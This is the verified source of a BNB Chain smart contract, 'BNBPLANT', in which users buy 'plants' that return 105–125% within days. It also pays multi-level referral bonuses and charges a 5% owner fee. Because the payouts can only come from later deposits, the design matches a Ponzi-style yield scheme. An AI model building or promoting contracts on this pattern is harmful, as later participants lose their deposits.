/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.7;

struct Plant {
  uint8 life_days;
  uint8 percent;
  uint256 price;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40  last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[2] structure; 
}

 struct Item { 
        uint totalamount;
        address wallet;
    }

contract BNBPLANT {
    
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalusers;
    uint40 constant public  TIME_STEP = 24*3600; // 24 hour
    uint40 public StartDate ; 
    address public owner;
    uint8 constant BONUS_LINES_COUNT = 2;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [40, 30]; 

    mapping(uint8 => Plant) public plants;
    mapping(address => Player) public players;
    mapping(uint => Item) private itemIdToItem;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewBuyPlant(address indexed addr, uint256 amount, uint8 tarif);
    event ReBuyPlant(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() {
          
         owner = msg.sender;
     
         plants[1] = Plant(1, 105, 0.01 ether); //2day : 125%
         plants[2] = Plant(2, 110, 0.02 ether);
         plants[3] = Plant(3, 115, 0.03 ether);
         plants[4] = Plant(4, 120, 0.04 ether); //2day : 125%
         plants[5] = Plant(5, 125, 0.05 ether);
    
         StartDate = uint40(block.timestamp) + (48*3600); //after 2days
         totalusers = 0 ;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
             
            if(players[_addr].deposits.length == 0) {
               
              
               itemIdToItem[totalusers] = Item(0,_addr);  
               totalusers++;
            }

            players[_addr].upline = _upline;
           
            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function buyplant(uint8 _plantId, address _upline) external payable {
        
        // require(block.timestamp>StartDate,"Not Started Yet.");
        require(!isContract(msg.sender) && msg.sender == tx.origin,"Problem in wallet address.");
        require(plants[_plantId].life_days > 0, "Plant not found.");
        require(msg.value == plants[_plantId].price, "The amount sent is not equal to the price of the plant.");
         
        Player storage player = players[msg.sender];
        
        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _plantId,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);
      
       // payable(owner).transfer(msg.value / 10); //owner fee
        
        emit NewBuyPlant(msg.sender, msg.value, _plantId);
    }
    
    function withdraw() external {
       
       // require(block.timestamp>StartDate,"Not Started Yet.");
       
        Player storage player = players[msg.sender];
      // require(player.last_payout+TIME_STEP< block.timestamp, "only once a day");
       
        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;
        
        //amount = address(this).balance < amount ? address(this).balance : amount;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        uint256 fee = (amount * 5) / 100;
        payable(owner).transfer(fee); //5% owner fee
        payable(msg.sender).transfer(amount- fee);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Plant storage tarif = plants[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure,uint8[] memory userplants,uint40[] memory plantstimes) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

           uint8[] memory plantList = new uint8[](player.deposits.length);
           uint40[] memory plantTimes = new uint40[](player.deposits.length);
           uint8 counter=0;
           
            for(uint8 j = 0; j < player.deposits.length; j++) {
            Deposit storage dep = player.deposits[j];
            Plant storage plnt = plants[dep.tarif];
        
            uint40 time_end = dep.time + plnt.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

              if(from < to) {
                 plantList[counter] = dep.tarif;
                 plantTimes[counter] = dep.time;
                 counter++;
              }
           
            }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
            plantList,
            plantTimes
            
        );
    }

    function contractInfo() view external returns(uint _users,uint256 _balance, uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (totalusers, address(this).balance, invested, withdrawn, match_bonus);
    }

     function isContract(address _addr) internal view returns (bool){
       uint32 size;
       assembly {
       size := extcodesize(_addr)
          }
        return (size > 0);
      }

    function BlockTime() view external  returns(uint40 _timestamp){
        return uint40(block.timestamp);
    }

   
    function reinvest(uint8 _plantId) public {
		
         // require(block.timestamp>StartDate,"Not Started Yet.");
        require(!isContract(msg.sender) && msg.sender == tx.origin,"Problem in wallet address.");
        require(plants[_plantId].life_days > 0, "Plant not found.");

        uint256 price = plants[_plantId].price;
       
        Player storage player = players[msg.sender];
        
        _payout(msg.sender);
    
        uint256 amount = player.dividends + player.match_bonus; //user total withdrawable amount
        require(amount >=price , "Your withdrawable amount is not sufficient.");
       
        player.deposits.push(Deposit({
            tarif: _plantId,
            amount: price,
            time: uint40(block.timestamp)
        }));
        
      
        if(player.match_bonus>=price) 
         {player.match_bonus -= price;} 
        else if (player.dividends>=price)
         { player.dividends -= price;} 
        else
         {  uint256 diff =  price -  player.match_bonus;
           player.match_bonus = 0;
           player.dividends =  player.dividends - diff;
         }
 
        player.total_invested += price;
        player.total_withdrawn += price;
        invested += price;
        withdrawn += price;
        player.last_payout = uint40(block.timestamp);
        
        uint256 fee = (plants[_plantId].price * 5) / 100;
        payable(owner).transfer(fee); //5% owner fee
    
        emit ReBuyPlant(msg.sender, price, _plantId);
	}


    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }
   
    
    function getItems() internal view returns(Item[] memory) {
        uint totalMatches = 0;
        Item[] memory matches = new Item[](totalusers);

        for (uint i = 0; i < totalusers; i++) {
            Item memory e = itemIdToItem[i];
            matches[totalMatches] = e;
            totalMatches++;
        }

        return matches;
    }

    // Descending sort
    function sortby_totalamount() external view returns(Item[] memory toplist) {
      
        Item[] memory items = getItems();
         
         for (uint i = 0; i < items.length; i++){
               address _adr = items[i].wallet;
               items[i].totalamount = players[_adr].total_invested;
          }  

       for (uint i = 0; i < items.length; i++)
            for (uint j = 0; j < i; j++)
                if (items[i].totalamount > items[j].totalamount) {
                    Item memory x = items[i];
                    items[i] = items[j];
                    items[j] = x;
                }
    
        return items;
    }
   

}